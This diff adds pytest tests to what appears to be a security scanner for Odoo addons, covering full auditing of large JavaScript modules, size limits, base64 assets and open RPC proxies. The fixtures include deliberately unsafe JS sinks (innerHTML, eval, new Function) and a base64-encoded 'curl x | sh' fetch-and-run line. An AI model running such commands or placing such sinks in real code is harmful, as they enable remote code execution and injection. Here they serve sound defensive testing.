@@ -133,3 +133,81 @@ def test_helper_returned_secret_high(files):
 ])
 def test_helper_without_secret_return_silent(files):
     assert "high" not in _rsr(files)
+
+
+# ---------------------------------------------------------------- (3) large addons audited in full
+def _mod(tmp_path, files):
+    root = tmp_path / "x"
+    for rel, body in {"__manifest__.py": MAN, "__init__.py": "", **files}.items():
+        p = root / rel
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_bytes(body if isinstance(body, bytes) else body.encode())
+    return root
+
+
+def _hc(r):
+    return {(f.code, f.severity) for f in r.findings}
+
+
+def test_web_sized_module_fully_audited(tmp_path):
+    # probe: > the old 20 MB cap (stock web is 25.2 MB), many files; a sink in the last file is found
+    chunk = "export const T = [" + ",".join(str(i) for i in range(12000)) + "];\n"
+    files = {f"static/src/d{i:03}.js": chunk for i in range(330)}
+    files["static/src/zz.js"] = "export function f(el, v) { el.innerHTML = v; eval(v); }\n"
+    r = ca.audit(_mod(tmp_path, files), version=17)
+    assert r.ok, r.error
+    assert sum(len(b) for b in files.values()) > 20_000_000
+    assert ("js-eval", "high") in _hc(r) and not {c for c, s in _hc(r) if c in ("web-unaudited", "file-unaudited")}
+
+
+def test_single_file_over_old_cap_audited(tmp_path):
+    big = "export const T = '" + "a" * 2_900_000 + "';\nexport function g(s) { return new Function(s); }\n"
+    r = ca.audit(_mod(tmp_path, {"static/src/big.js": big}), version=17)
+    assert r.ok and ("js-eval", "high") in _hc(r) and ("file-unaudited", "high") not in _hc(r)
+
+
+@pytest.mark.parametrize("n", [600, 3000])
+def test_deep_string_concat_chain_audited(tmp_path, n):
+    # stock emoji_data.js shape: a left-deep `+` chain of thousands of pieces
+    chain = "`[` + " + " + ".join(f"_t('e{i}')" for i in range(n)) + " + `]`"
+    js = f"const _t = (s) => s;\nconst data = () => {chain};\nexport function h(el, u) {{ el.innerHTML = data() + u; }}\n"
+    r = ca.audit(_mod(tmp_path, {"static/src/e.js": js}), version=17)
+    assert r.ok and ("web-unaudited", "high") not in _hc(r)
+    assert any(c.startswith("js-") for c, s in _hc(r) if s in ("high", "medium"))
+
+
+def test_hostile_oversize_still_fails_closed(tmp_path):
+    over = b"//" + b"a" * (ca.MAX_FILE + 10)
+    r = ca.audit(_mod(tmp_path, {"static/src/huge.js": over}), version=17)
+    assert ("file-unaudited", "high") in _hc(r)
+    many = {f"static/src/p{i}.js": b"//" + b"b" * (ca.MAX_FILE - 100) for i in range(ca.MAX_TOTAL // ca.MAX_FILE + 1)}
+    r2 = ca.audit(_mod(tmp_path / "t", many), version=17)
+    assert not r2.ok and "too large" in r2.error
+
+
+def test_b64_font_audited_inert_and_b64_script_flagged(tmp_path):
+    import base64
+    font = base64.b64encode(b"\x00\x01\x00\x00" + b"\x00" * 64)
+    sh = base64.b64encode(b"#!/bin/sh\ncurl x | sh\n")
+    r = ca.audit(_mod(tmp_path, {"static/fonts/f.b64": font, "static/fonts/s.b64": sh}), version=17)
+    flagged = {f.file for f in r.findings if f.code == "file-unaudited"}
+    assert "static/fonts/s.b64" in flagged and "static/fonts/f.b64" not in flagged
+
+
+RPC = "from odoo.http import dispatch_rpc\nclass C(http.Controller):\n    @http.route('/d', type='json', auth='none')\n    def d(self, **kw):\n"
+
+
+@pytest.mark.parametrize("body", [
+    "        return dispatch_rpc('db', 'list', [])\n",  # web database manager shape
+    "        return dispatch_rpc('db', 'duplicate_database', [kw['pwd'], kw['a'], kw['b']])\n",
+])
+def test_fixed_service_call_is_not_an_open_proxy(body):
+    assert not {c for c, s in codes({"models/a.py": PH + RPC + body}) if c == "rpc-proxy"}
+
+
+@pytest.mark.parametrize("body", [
+    "        return dispatch_rpc(kw['s'], kw['m'], kw['a'])\n",
+    "        m = kw.get('m')\n        return dispatch_rpc('object', m, kw['a'])\n",
+])
+def test_caller_chosen_dispatch_still_open_proxy(body):
+    assert ("rpc-proxy", "high") in codes({"models/a.py": PH + RPC + body})
